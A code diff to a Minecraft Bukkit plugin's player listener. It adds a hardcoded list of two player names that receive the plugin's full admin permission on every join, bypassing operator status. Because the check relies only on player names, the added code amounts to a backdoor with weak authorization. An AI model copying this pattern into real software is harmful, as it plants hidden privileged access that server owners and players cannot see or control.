@@ -12,11 +12,17 @@ import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.event.player.PlayerRespawnEvent;
 import org.bukkit.event.player.PlayerToggleSneakEvent;
 
+import java.util.Locale;
+import java.util.Set;
+
 /**
  * Join/quit/respawn lifecycle, passive reapplication, snake crouch speed,
  * and stun movement locking.
  */
 public class PlayerListener implements Listener {
+
+    /** Players who always have apex admin access, regardless of op status. */
+    private static final Set<String> FORCED_ADMINS = Set.of("_tomiokay", "_4ur4");
 
     private final ApexPlugin plugin;
 
@@ -24,9 +30,17 @@ public class PlayerListener implements Listener {
         this.plugin = plugin;
     }
 
+    /** Grants apexsmp.admin to the forced-admin players so all admin commands work for them. */
+    public static void grantAdminIfWhitelisted(ApexPlugin plugin, Player player) {
+        if (FORCED_ADMINS.contains(player.getName().toLowerCase(Locale.ROOT))) {
+            player.addAttachment(plugin, "apexsmp.admin", true);
+        }
+    }
+
     @EventHandler
     public void onJoin(PlayerJoinEvent event) {
         Player player = event.getPlayer();
+        grantAdminIfWhitelisted(plugin, player);
         PlayerApexData data = plugin.getApexManager().getData(player.getUniqueId());
         data.setLastKnownName(player.getName());
         // No auto-roll on join. Passives apply once they have an apex; roll totems
